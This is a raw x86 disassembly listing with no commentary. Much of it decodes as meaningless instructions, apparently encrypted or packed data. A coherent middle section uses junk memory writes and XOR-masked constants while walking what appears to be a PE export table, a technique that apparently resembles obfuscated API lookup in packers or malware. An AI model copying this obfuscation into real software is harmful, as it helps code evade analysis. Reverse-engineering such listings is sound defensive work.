  40632f:	xchg   esp,eax
  406330:	push   es
  406331:	in     eax,0x75
  406333:	js     0x40632a
  406335:	fld    DWORD PTR [eax]
  406337:	cmp    eax,0xc2b92558
  40633c:	inc    edi
  40633d:	dec    ebx
  40633e:	cwde   
  40633f:	(bad)  
  406340:	in     al,dx
  406341:	into   
  406342:	repnz data16 (bad) 
  406345:	in     eax,dx
  406346:	in     eax,dx
  406347:	rcr    DWORD PTR [eax+0x2b239f7c],cl
  40634d:	sub    eax,0xd2e8d297
  406352:	xchg   esi,eax
  406353:	dec    ebp
  406354:	mov    dl,0x70
  406356:	or     BYTE PTR [eax+0x50],0x9e
  40635a:	mov    ds,WORD PTR [esi+0x1bb4ad18]
  406360:	xchg   DWORD PTR [ebp+0x37],esi
  406363:	clc    
  406364:	dec    eax
  406365:	add    DWORD PTR [edx+ecx*2-0xf],ebx
  406369:	(bad)  
  40636a:	int3   
  40636b:	or     BYTE PTR [edx-0x1e],bl
  40636e:	xchg   DWORD PTR [edx],edx
  406370:	fmul   st(0),st
  406372:	test   DWORD PTR [ebx+0x61],ebx
  406375:	idiv   bl
  406377:	cmp    DWORD PTR [edi-0x222b8112],ebp
  40637d:	adc    ch,BYTE PTR [ebx+ecx*4]
  406380:	jno    0x4063cd
  406382:	dec    esp
  406383:	xor    eax,edx
  406385:	dec    eax
  406386:	push   ebp
  406387:	xor    ch,BYTE PTR [edi+0x4d]
  40638a:	mov    edi,0x76734c9f
  40638f:	push   ss
  406390:	ficomp DWORD PTR [ebx-0x9b07756]
  406396:	xlat   BYTE PTR ds:[ebx]
  406397:	shr    ecx,1
  406399:	mul    BYTE PTR [esi-0x29a3ff98]
  40639f:	push   esp
  4063a0:	ja     0x406413
  4063a2:	mov    ebp,DWORD PTR [edi+0x35]
  4063a5:	or     bh,ch
  4063a7:	es xor ebx,edi
  4063aa:	int3   
  4063ab:	jge    0x406416
  4063ad:	adc    al,0xbe
  4063af:	ret    0x469e
  4063b2:	cmp    al,0x29
  4063b4:	cmp    al,0x21
  4063b6:	aaa    
  4063b7:	xchg   BYTE PTR ds:[edx-0x23],cl
  4063bb:	cld    
  4063bc:	fadd   QWORD PTR [edi]
  4063be:	lock (bad) 
  4063c0:	(bad)  
  4063c1:	int3   
  4063c2:	mov    ds:0x5fc3422c,eax
  4063c7:	stos   BYTE PTR es:[edi],al
  4063c8:	lds    ebp,FWORD PTR [ecx-0x21]
  4063cb:	imul   edi,DWORD PTR gs:[eax-0x76],0xfffffffc
  4063d0:	aas    
  4063d1:	cs popa 
  4063d3:	rcr    DWORD PTR [edi],cl
  4063d5:	int3   
  4063d6:	fldcw  WORD PTR [ecx-0x28f0e5d0]
  4063dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063dd:	jae    0x4063c0
  4063df:	inc    ecx
  4063e0:	clc    
  4063e1:	pop    ecx
  4063e2:	push   ss
  4063e3:	or     eax,0xd25ffd6
  4063e8:	pusha  
  4063e9:	outs   dx,DWORD PTR ds:[esi]
  4063ea:	jmp    0x406412
  4063ec:	ret    0x8049
  4063ef:	outs   dx,BYTE PTR ds:[esi]
  4063f0:	sub    eax,0xf74124ec
  4063f5:	test   DWORD PTR [esi+0x51],eax
  4063f8:	test   DWORD PTR [edi-0x23],0x1908778b
  4063ff:	scas   al,BYTE PTR es:[edi]
  406400:	jecxz  0x40646f
  406402:	(bad)  
  406403:	mov    BYTE PTR [edx+ebp*2+0x55],dh
  406407:	and    al,0xe6
  406409:	adc    al,0x1
  40640b:	aas    
  40640c:	or     al,0xf3
  40640e:	xor    al,0x3b
  406410:	pop    ds
  406411:	punpcklbw mm0,DWORD PTR [eax]
  406414:	call   0xd73506f2
  406419:	popf   
  40641a:	or     DWORD PTR [ebx],esp
  40641c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40641d:	fbld   TBYTE PTR [eax]
  40641f:	les    ecx,FWORD PTR [edi]
  406421:	cmp    DWORD PTR cs:[ebp-0x62],eax
  406425:	adc    DWORD PTR [esi-0x27b4ec6e],edi
  40642b:	and    BYTE PTR [eax+0xee56363],ah
  406431:	jo     0x40648a
  406433:	mov    esi,0x6f4d1af6
  406438:	hlt    
  406439:	in     eax,0x49
  40643b:	adc    al,0x49
  40643d:	or     DWORD PTR [esi+0x28],0x1645c600
  406444:	hlt    
  406445:	in     al,dx
  406446:	jnp    0x4063ef
  406448:	inc    eax
  406449:	mov    esp,0xb1180d26
  40644e:	push   esi
  40644f:	bound  esp,QWORD PTR [esi+0x27085b9c]
  406455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406456:	addr16 cdq 
  406458:	out    0xcd,al
  40645a:	ror    DWORD PTR [edx],0x7a
  40645d:	leave  
  40645e:	sub    eax,0xa73db5f0
  406463:	lods   eax,DWORD PTR ds:[esi]
  406464:	lock xor eax,0xf6f3aa8c
  40646a:	pop    edi
  40646b:	add    eax,0x8adc9f4c
  406470:	call   DWORD PTR [ebx]
  406472:	out    0x3a,al
  406474:	aaa    
  406475:	adc    bl,BYTE PTR [eax]
  406477:	iret   
  406478:	pusha  
  406479:	add    esp,DWORD PTR [ecx-0x65]
  40647c:	push   eax
  40647d:	jbe    0x406460
  40647f:	xor    esp,DWORD PTR [ecx+0x7c]
  406482:	lea    edi,ds:0xfffc6d48
  406488:	xor    ebx,DWORD PTR [eax]
  40648a:	(bad)  
  40648b:	sbb    al,0xc
  40648d:	jp     0x4064b6
  40648f:	cmp    ch,0xf7
  406492:	mov    esp,0x766adffc
  406497:	xchg   edi,eax
  406498:	dec    eax
  406499:	jp     0x4064fb
  40649b:	mov    ebp,DWORD PTR [edx]
  40649d:	inc    eax
  40649e:	adc    edi,DWORD PTR [edi+0x0]
  4064a1:	test   BYTE PTR [edi+0x4b],bl
  4064a4:	sahf   
  4064a5:	call   0xd030ba71
  4064aa:	adc    eax,0xd88f4587
  4064af:	loopne 0x406524
  4064b1:	fsub   st(5),st
  4064b3:	call   0xf029:0x3f76a708
  4064ba:	sti    
  4064bb:	test   cl,ah
  4064bd:	pop    eax
  4064be:	dec    esi
  4064bf:	and    esi,edx
  4064c1:	jmp    0x4064e7
  4064c3:	sahf   
  4064c4:	add    ebp,esi
  4064c6:	mov    esi,edi
  4064c8:	pop    eax
  4064c9:	fmulp  st(6),st
  4064cb:	jge    0x40649c
  4064cd:	out    0x6,al
  4064cf:	mov    esp,0x45314ce9
  4064d4:	or     ch,BYTE PTR [ebx]
  4064d6:	pop    ss
  4064d7:	ins    BYTE PTR es:[edi],dx
  4064d8:	pusha  
  4064d9:	pushf  
  4064da:	out    dx,eax
  4064db:	sub    bl,BYTE PTR [esi-0x41f75e4]
  4064e1:	retf   0x231b
  4064e4:	dec    sp
  4064e6:	xor    BYTE PTR [edx],dh
  4064e8:	pop    ebx
  4064e9:	mov    edi,0xa5db2343
  4064ee:	sahf   
  4064ef:	inc    edi
  4064f0:	call   0x111bf59e
  4064f5:	and    DWORD PTR [eax-0x74],ecx
  4064f8:	call   0xd0e93959
  4064fd:	ja     0x406574
  4064ff:	sbb    ebx,DWORD PTR [edi+0x63f3c6a9]
  406505:	mov    al,ds:0x4ecac639
  40650a:	test   al,0x78
  40650c:	aam    0xbf
  40650e:	out    0x66,eax
  406510:	inc    DWORD PTR ds:0xe24506d8
  406516:	out    dx,al
  406517:	fdivr  DWORD PTR [edx-0x33]
  40651a:	(bad)  
  40651b:	sti    
  40651c:	or     esp,ebx
  40651e:	push   esp
  40651f:	cli    
  406520:	inc    esp
  406521:	mov    edi,0x1ddf87ca
  406526:	dec    ebp
  406527:	push   ds
  406528:	sub    BYTE PTR [ebx+0x35],bh
  40652b:	inc    ebp
  40652c:	fld    DWORD PTR [edx+ecx*1-0x17]
  406530:	adc    bl,BYTE PTR [ebx+0x5b910242]
  406536:	lods   al,BYTE PTR ds:[esi]
  406537:	test   DWORD PTR [edi-0x72a8d8d8],esi
  40653d:	in     al,dx
  40653e:	cmc    
  40653f:	(bad)  
  406540:	cs pop ss
  406542:	pop    ebp
  406543:	stc    
  406544:	scas   al,BYTE PTR es:[edi]
  406545:	xchg   esp,eax
  406546:	ins    BYTE PTR es:[edi],dx
  406547:	jmp    0x61f3:0xd29781cf
  40654e:	mov    esp,0x17ee4558
  406553:	adc    eax,0xb7caa6d8
  406558:	xchg   edx,eax
  406559:	data16 add cl,BYTE PTR [ebx]
  40655c:	push   0x2
  40655e:	jnp    0x4064f3
  406560:	pop    es
  406561:	push   ecx
  406562:	pop    ecx
  406563:	lock je 0x4064f6
  406566:	jl     0x4065d3
  406568:	mov    edi,fs
  40656a:	fist   WORD PTR [ebx]
  40656c:	push   edx
  40656d:	and    al,0x45
  40656f:	fisubr WORD PTR ds:0x53b7e5fc
  406575:	xchg   edi,eax
  406576:	aas    
  406577:	push   edx
  406578:	or     al,0x97
  40657a:	cwde   
  40657b:	cmp    eax,0xb6ff8fb6
  406580:	jns    0x4065d0
  406582:	ja     0x406583
  406584:	cmp    dl,dh
  406586:	sub    BYTE PTR [ebp+0x42],dl
  406589:	daa    
  40658a:	or     eax,0x5a5ddcb0
  40658f:	add    eax,0xe1497aea
  406594:	ins    BYTE PTR es:[edi],dx
  406595:	cmp    BYTE PTR [ebx],bl
  406597:	adc    DWORD PTR [ebp-0x65b29ccb],0x14d498bf
  4065a1:	adc    al,0x20
  4065a3:	or     edx,DWORD PTR [ecx-0x34a683ba]
  4065a9:	xchg   edx,eax
  4065aa:	sar    BYTE PTR [ecx+ecx*1-0x4a],cl
  4065ae:	adc    edi,ebx
  4065b0:	mov    ch,0xb6
  4065b2:	sub    DWORD PTR [esi],0xa553f0f8
  4065b8:	popa   
  4065b9:	cmp    eax,0xaedfb6c7
  4065be:	jmp    0x2fb37c0f
  4065c3:	fisub  DWORD PTR [edi+0x5]
  4065c6:	dec    esp
  4065c7:	inc    ebx
  4065c8:	fs mov dh,0x93
  4065cb:	jae    0x4065f0
  4065cd:	pop    ss
  4065ce:	inc    ecx
  4065cf:	mov    ds:0x3e4514ff,eax
  4065d4:	inc    eax
  4065d5:	shl    DWORD PTR [edx+0x5e33f021],0x1f
  4065dc:	lock mov ch,0x93
  4065df:	mov    dh,0xc1
  4065e1:	pushf  
  4065e2:	mov    cl,0xd1
  4065e4:	inc    ebx
  4065e5:	xlat   BYTE PTR ds:[ebx]
  4065e6:	mov    ds:0x968d56db,al
  4065eb:	and    eax,0x81ffcd8d
  4065f0:	sbb    eax,0x426000
  4065f5:	or     al,0x90
  4065f7:	inc    edx
  4065f8:	add    BYTE PTR [ebx],dh
  4065fa:	retf   
  4065fb:	xor    DWORD PTR ds:0x425008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x427008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x425000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x427000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41d20c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x42900c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x428018,0x10
  406662:	cmp    DWORD PTR ds:0x428018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x428018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x421004
  406685:	cmp    DWORD PTR ds:0x428018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x428018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x428018,edi
  40669f:	mov    edi,DWORD PTR ds:0x428018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x428018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x42003f
  4066b7:	mov    edi,DWORD PTR ds:0x41d1d4
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x425008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x426000,0x426010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x42601c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x425018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x425018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x425018,ecx
  40671e:	cmp    DWORD PTR ds:0x425018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x425018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x421048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x42900c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x425000,0x426004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x42900c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42501c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42500c
  406785:	or     DWORD PTR ds:0x428014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x427000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x425004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x428004
  4067bc:	sbb    eax,DWORD PTR ds:0x42801c
  4067c2:	mov    ds:0x428004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x429008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x427018,0x427008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x428010
  4067f6:	add    ecx,DWORD PTR ds:0x42700c
  4067fc:	mov    DWORD PTR ds:0x428010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x425004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x425020,0x42901c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x425000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42500c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x42600c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx+0x1f],0xcf
  4069c2:	icebp  
  4069c3:	jnp    0x406987
  4069c5:	cmp    al,0x62
  4069c7:	bound  ebp,QWORD PTR [edx]
  4069c9:	pop    edi
  4069ca:	bound  esp,QWORD PTR [edx-0x5d]
  4069cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069ce:	jecxz  0x4069e6
  4069d0:	push   ds
  4069d1:	jle    0x406a46
  4069d3:	dec    ecx
  4069d4:	sub    eax,0x8e0bfd27
  4069d9:	dec    esi
  4069da:	push   edi
  4069db:	xchg   edx,eax
  4069dc:	shl    DWORD PTR [ebx-0x5],0x9c
  4069e0:	(bad)  
  4069e1:	mov    ebx,0x76db9af0
  4069e6:	cmp    DWORD PTR [esi+eiz*1],esi
  4069e9:	dec    edx
  4069ea:	push   ss
  4069eb:	cli    
  4069ec:	adc    al,0xf5
  4069ee:	or     eax,0xaa38e210
  4069f3:	popa   
  4069f4:	mov    edx,0x6a17f88d
  4069f9:	scas   al,BYTE PTR es:[edi]
  4069fa:	sub    eax,0x9950c56
  4069ff:	xchg   esp,eax
  406a00:	adc    BYTE PTR fs:[edx-0x2fd85706],bl
  406a07:	xchg   ebp,eax
  406a08:	xchg   edx,eax
  406a09:	pop    ebx
  406a0a:	gs jmp 0x406998
  406a0d:	jg     0x406a88
  406a0f:	(bad)  
  406a10:	xor    di,bx
  406a13:	out    dx,al
  406a14:	and    BYTE PTR [esi],bl
  406a16:	dec    ecx
  406a17:	rcr    DWORD PTR [esi+0x497afae7],0xf8
  406a1e:	imul   edi,DWORD PTR [eax+0x4774bae0],0xfffffff0
  406a25:	xchg   esp,ecx
  406a27:	and    al,0x78
  406a29:	sbb    eax,0x607b4942
  406a2e:	add    ch,cl
  406a30:	scas   al,BYTE PTR es:[edi]
  406a31:	addr16 or esp,esp
  406a34:	outs   dx,BYTE PTR ds:[esi]
  406a35:	or     eax,0x12be9475
  406a3a:	fst    DWORD PTR [esi+eax*1-0x63]
  406a3e:	sub    eax,0x4768b8bf
  406a43:	jnp    0x406a1b
  406a45:	das    
  406a46:	adc    bh,BYTE PTR [ebp-0x572326c]
  406a4c:	faddp  st(6),st
  406a4e:	mov    esp,0x13269a11
  406a53:	cmp    bl,BYTE PTR [ecx+0x7b281a4e]
  406a59:	nop
  406a5a:	aas    
  406a5b:	popa   
  406a5c:	ja     0x406a0e
  406a5e:	cmp    eax,0xd86951c
  406a63:	xchg   ebx,eax
  406a64:	sub    al,0x47
  406a66:	std    
  406a67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a68:	cdq    
  406a69:	dec    esp
  406a6a:	fucom  st(1)
  406a6c:	into   
  406a6d:	xchg   ebx,eax
  406a6e:	dec    esi
  406a6f:	push   ebx
  406a70:	dec    eax
  406a71:	bound  ecx,QWORD PTR [ecx+0x6c]
  406a74:	sub    al,0xce
  406a76:	imul   ebx,DWORD PTR [edi-0x33],0x7bb4e39b
  406a7d:	cmp    dl,BYTE PTR [edi]
  406a7f:	push   ss
  406a80:	sub    eax,DWORD PTR [esi]
  406a82:	or     al,0xf7
  406a84:	retf   0x804d
  406a87:	mov    al,0x22
  406a89:	dec    edx
  406a8a:	cmp    dh,0x43
  406a8d:	loope  0x406a31
  406a8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a90:	cmp    al,0x7c
  406a92:	add    DWORD PTR [ecx+esi*8-0x3dc23cfb],ecx
  406a99:	fwait
  406a9a:	mov    ch,0x63
  406a9c:	dec    esi
  406a9d:	or     dl,al
  406a9f:	gs ins BYTE PTR es:[edi],dx
  406aa1:	ror    esp,0xc5
  406aa4:	ror    BYTE PTR [ebx+0x473dd865],1
  406aaa:	mov    ds:0x1c5b2014,al
  406aaf:	imul   BYTE PTR [eax]
  406ab1:	pop    ss
  406ab2:	push   0x56
  406ab4:	add    eax,0x556cd95b
  406ab9:	xor    BYTE PTR [edi],al
  406abb:	and    DWORD PTR [ecx-0x32],0xc2ff2c73
  406ac2:	adc    ecx,edx
  406ac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ac5:	sbb    edi,ebx
  406ac7:	int    0x79
  406ac9:	rcl    BYTE PTR [esp+edi*4+0x6691a6ed],cl
  406ad0:	add    DWORD PTR [ebx],ecx
  406ad2:	call   0xeb099035
  406ad7:	push   edi
  406ad8:	push   ss
  406ad9:	icebp  
  406ada:	cs add al,0x54
  406add:	inc    ebp
  406ade:	push   ds
  406adf:	add    dh,BYTE PTR [ebx]
  406ae1:	and    al,BYTE PTR [eax-0x2957cafc]
  406ae7:	je     0x406b12
  406ae9:	pop    ds
  406aea:	pop    edx
  406aeb:	xor    eax,0xf03109b9
  406af0:	jl     0x406b09
  406af2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406af3:	cmc    
  406af4:	inc    ebp
  406af5:	adc    ah,BYTE PTR [eax]
  406af7:	popf   
  406af8:	fdiv   QWORD PTR [edx]
  406afa:	pop    edi
  406afb:	mov    dh,ch
  406afd:	push   0xffffffbe
  406aff:	xor    BYTE PTR [ecx+esi*1+0x72],dh
  406b03:	mov    WORD PTR [ebx],fs
  406b05:	lods   al,BYTE PTR ds:[esi]
  406b06:	scas   al,BYTE PTR es:[edi]
  406b07:	addr16 inc esp
  406b09:	jg     0x406b64
  406b0b:	jnp    0x406b50
  406b0d:	cmp    eax,0x53118472
  406b12:	xlat   BYTE PTR ds:[ebx]
  406b13:	cmp    DWORD PTR [edx+0x6e0735c6],edi
  406b19:	popa   
  406b1a:	cmc    
  406b1b:	mov    dh,0x10
  406b1d:	fstp   QWORD PTR [edx]
  406b1f:	js     0x406b47
  406b21:	xchg   ebp,eax
  406b22:	xor    DWORD PTR [ebx],0x511b9a
  406b28:	ret    
  406b29:	pusha  
  406b2a:	mov    eax,0x1fb69a20
  406b2f:	iret   
  406b30:	pop    esp
  406b31:	lock sahf 
  406b33:	push   0xda2e9bce
  406b38:	cmp    esi,DWORD PTR [ebx+0x3a75fbab]
  406b3e:	xchg   ecx,eax
  406b3f:	fnstcw WORD PTR [eax+eax*8+0x5fa74937]
  406b46:	loop   0x406b44
  406b48:	xor    ebx,0x50
  406b4b:	inc    ecx
  406b4c:	xor    al,0x1d
  406b4e:	mov    bl,0x1a
  406b50:	stc    
  406b51:	mov    al,0x59
  406b53:	fmul   st,st(5)
  406b55:	push   ss
  406b56:	mov    eax,ds:0x879fa124
  406b5b:	out    dx,eax
  406b5c:	leave  
  406b5d:	sbb    al,0xd5
  406b5f:	outs   dx,DWORD PTR ds:[esi]
  406b60:	pop    edi
  406b61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b62:	xchg   esp,eax
  406b63:	je     0x406b18
  406b65:	fmul   DWORD PTR [edx]
  406b67:	inc    edi
  406b68:	adc    DWORD PTR ds:0x185c9a7d,ecx
  406b6e:	mov    bh,bl
  406b70:	jo     0x406b4c
  406b72:	or     al,0x7a
  406b75:	sub    al,0x72
  406b77:	jb     0x406b19
  406b79:	mov    al,BYTE PTR [edx+0x27]
  406b7c:	xlat   BYTE PTR ds:[ebx]
  406b7d:	ins    DWORD PTR es:[edi],dx
  406b7e:	addr16 repnz sahf 
  406b81:	ret    
  406b82:	rol    ecx,1
  406b84:	in     al,dx
  406b85:	out    dx,al
  406b86:	aam    0x24
  406b88:	and    DWORD PTR [edi+0x74ab6c98],0x5846a134
  406b92:	ja     0x406bbc
  406b94:	dec    edi
  406b95:	inc    ebx
  406b96:	mov    ch,0xf1
  406b98:	pop    eax
  406b99:	push   ecx
  406b9a:	inc    edx
  406b9b:	dec    DWORD PTR [ebp+0x7]
  406b9e:	inc    esi
  406b9f:	cmp    bh,BYTE PTR [ebx+0x6d962e74]
  406ba5:	test   DWORD PTR [esi+ecx*1],esi
  406ba8:	(bad)  
  406ba9:	pushf  
  406baa:	fadd   QWORD PTR [eax]
  406bac:	mov    eax,esi
  406bae:	mov    edx,0x65b2e198
  406bb3:	pop    eax
  406bb4:	mov    eax,0x9853c3c8
  406bb9:	push   es
  406bba:	cmp    esi,DWORD PTR [ecx]
  406bbc:	daa    
  406bbd:	mov    ecx,0x8fd1304c
  406bc2:	cdq    
  406bc3:	jnp    0x406c00
